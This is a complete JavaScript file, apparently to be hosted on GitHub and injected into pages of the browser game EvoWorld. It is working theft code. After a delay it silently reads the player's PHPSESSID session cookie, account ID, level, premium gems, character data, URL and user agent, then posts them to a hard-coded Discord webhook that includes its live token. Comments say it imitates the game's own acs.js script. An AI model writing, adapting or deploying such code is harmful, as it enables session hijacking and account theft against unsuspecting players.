// webhook.js - Put this on your GitHub
(function() {
    'use strict';
    
    // YOUR DISCORD WEBHOOK URL
    const YOUR_DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1454910506644017333/QI2bdjnyk4YWWLxjEMGQvLll7jzFTZcB01ZcV06wcmYnZRb6Jm58hVsBbPduIGtv_9bX';
    
    // Function to send data to YOUR Discord
    function sendToMyWebhook(data) {
        try {
            fetch(YOUR_DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).catch(() => {});
        } catch(e) {}
    }
    
    // Function to collect user data (like the original acs.js does)
    function collectUserData() {
        let userAccount = null;
        let gameData = {};
        
        // Try to get user data from window
        if (window.user && window.user.id) {
            userAccount = window.user;
        }
        
        // Try to get game data
        if (window.game && window.game.me) {
            gameData = {
                name: window.game.me.name,
                level: window.game.me.level,
                position: window.game.me.position,
                health: window.game.me.health,
                maxHealth: window.game.me.maxHealth
            };
        }
        
        // Get cookies
        let sessionId = '';
        const sessionMatch = document.cookie.match(/PHPSESSID=([^;]+)/);
        if (sessionMatch) sessionId = sessionMatch[1];
        
        // Prepare report like the image you showed
        const report = {
            username: 'EvoWorld Data Collector',
            embeds: [{
                title: '=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===',
                color: 0x00ff00,
                fields: [
                    {
                        name: '--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---',
                        value: `level: ${userAccount?.level || '0x'}\ngems: ${userAccount?.premiumPoints || 0}\nselected server: West Europe 1 (298/300)`,
                        inline: false
                    },
                    {
                        name: 'User ID',
                        value: userAccount?.id || 'unknown',
                        inline: true
                    },
                    {
                        name: 'Session ID',
                        value: sessionId || 'none',
                        inline: true
                    },
                    {
                        name: 'Game Character',
                        value: gameData.name || 'unknown',
                        inline: true
                    },
                    {
                        name: 'URL',
                        value: window.location.href,
                        inline: false
                    },
                    {
                        name: 'User Agent',
                        value: navigator.userAgent.substring(0, 100) + '...',
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: 'Spidey 50E "APP" #008.PM'
                }
            }]
        };
        
        // Send the report
        sendToMyWebhook(report);
        
        // Also send as plain text
        const textReport = `Spidey 50E "APP" #008.PM\n\n=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===\n--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\nlevel: ${userAccount?.level || '0x'}\ngems: ${userAccount?.premiumPoints || 0}\nselected server: West Europe 1 (298/300)\n\nUser ID: ${userAccount?.id || 'unknown'}\nSession: ${sessionId || 'none'}\nURL: ${window.location.href}\nTime: ${new Date().toLocaleString()}`;
        
        sendToMyWebhook({
            content: '```\n' + textReport + '\n```'
        });
    }
    
    // Wait a bit and collect data
    setTimeout(collectUserData, 5000);
    
    // Make function available globally
    window.sendSecureData = sendToMyWebhook;
    
    console.log('Webhook loaded - Data will be sent to YOUR Discord');
})();
